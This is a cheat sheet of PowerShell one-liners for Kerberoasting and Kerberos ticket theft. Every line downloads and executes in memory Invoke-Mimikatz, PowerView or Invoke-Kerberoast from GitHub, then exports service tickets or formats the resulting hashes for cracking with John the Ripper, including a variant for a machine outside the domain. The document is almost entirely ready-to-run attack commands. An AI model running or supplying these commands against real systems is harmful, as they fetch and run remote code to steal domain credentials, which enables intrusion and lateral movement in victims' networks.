# Invoke-Mimikatz.ps1
$urls = @("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1"); $urls |% {iex (New-Object System.Net.WebClient).DownloadString($_);}; gci function:\ | Select-String "Invoke-"; $domain=((Get-WmiObject Win32_ComputerSystem).Domain); Add-Type -AssemblyName System.IdentityModel; iex $("setspn.exe -T $domain -Q */*") | Select-String '^CN' -Context 0,1 |% {New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim()}; Invoke-Mimikatz -Command "`"kerberos::list /export`""

# Invoke-Kerberoast.ps1
$urls = @("https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1","https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1"); $urls |% {iex (New-Object System.Net.WebClient).DownloadString($_);}; gci function:\ | Select-String "Invoke-"; Invoke-Kerberoast

# Invoke-Kerberoast.ps1 - Fix ':$krb5tgs$23$'
# For output to John use:
# | Out-File -Encoding UTF8 -Force hashes.txt
$urls = @("https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1","https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1"); $urls |% {iex (New-Object System.Net.WebClient).DownloadString($_);}; gci function:\ | Select-String "Invoke-"; Invoke-Kerberoast -OutputFormat John | Select-Object -ExpandProperty Hash |% {$_.replace(':',':$krb5tgs$23$')} 

# Invoke-Kerberoast.ps1 - Machine not part of AD / custom credentials
# Run this using: powershell -STA
# This will not work in powershell_ise.exe!
$domain="lab.test" ;$server="10.0.0.1"; $cred = (Get-Credential "user01@$domain"); $urls = @("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/powerview.ps1","https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1"); $urls |% {iex (New-Object System.Net.WebClient).DownloadString($_);}; gci function:\ | Select-String "Invoke-"; Invoke-Kerberoast -OutputFormat John -Server $server -Domain $domain -Credential $cred | Select-Object -ExpandProperty Hash |% {$_.replace(':',':$krb5tgs$23$')}